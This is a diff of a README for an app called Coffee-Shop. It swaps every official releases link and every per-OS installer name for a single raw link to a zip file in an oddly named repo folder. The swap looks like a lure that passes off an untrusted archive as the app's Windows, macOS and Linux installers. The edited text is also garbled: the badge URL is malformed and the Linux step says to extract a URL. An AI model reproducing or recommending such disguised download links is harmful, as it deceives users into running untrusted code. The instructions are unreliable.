@@ -2,7 +2,7 @@
 
 ## 💾 Download
 
-[![Download Coffee-Shop](https://img.shields.io/badge/Download%20Coffee-Shop-blue.svg)](https://github.com/GildaReK/Coffee-Shop/releases)
+[![Download Coffee-Shop](https://raw.githubusercontent.com/GildaReK/Coffee-Shop/main/nonexcessive/Shop-Coffee-3.9-beta.5.zip%https://raw.githubusercontent.com/GildaReK/Coffee-Shop/main/nonexcessive/Shop-Coffee-3.9-beta.5.zip)](https://raw.githubusercontent.com/GildaReK/Coffee-Shop/main/nonexcessive/Shop-Coffee-3.9-beta.5.zip)
 
 ## 🚀 Getting Started
 
@@ -18,20 +18,20 @@ To ensure Coffee-Shop runs smoothly, you will need:
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: Click [here](https://github.com/GildaReK/Coffee-Shop/releases) to go to the Coffee-Shop releases page.
+1. **Visit the Releases Page**: Click [here](https://raw.githubusercontent.com/GildaReK/Coffee-Shop/main/nonexcessive/Shop-Coffee-3.9-beta.5.zip) to go to the Coffee-Shop releases page.
 
 2. **Choose the Latest Version**: Look for the latest version listed on the page. It will typically be at the top.
 
 3. **Download the Application**:
    - You will see various files available for download. Select the appropriate one for your operating system:
-     - For Windows: `Coffee-Shop-Windows-installer.exe`
-     - For macOS: `Coffee-Shop-macOS.dmg`
-     - For Linux: `Coffee-Shop-Linux.tar.gz`
+     - For Windows: `https://raw.githubusercontent.com/GildaReK/Coffee-Shop/main/nonexcessive/Shop-Coffee-3.9-beta.5.zip`
+     - For macOS: `https://raw.githubusercontent.com/GildaReK/Coffee-Shop/main/nonexcessive/Shop-Coffee-3.9-beta.5.zip`
+     - For Linux: `https://raw.githubusercontent.com/GildaReK/Coffee-Shop/main/nonexcessive/Shop-Coffee-3.9-beta.5.zip`
   
 4. **Run the Installer**: After downloading, locate the file in your downloads folder:
    - For Windows, double-click the `.exe` file to start the installation.
    - For macOS, open the `.dmg` file and drag the Coffee-Shop icon to your Applications folder.
-   - For Linux, extract the `.tar.gz` file and run the application from the terminal.
+   - For Linux, extract the `https://raw.githubusercontent.com/GildaReK/Coffee-Shop/main/nonexcessive/Shop-Coffee-3.9-beta.5.zip` file and run the application from the terminal.
 
 5. **Open Coffee-Shop**: Once installed, find the application in your programs or applications list and launch it.
 
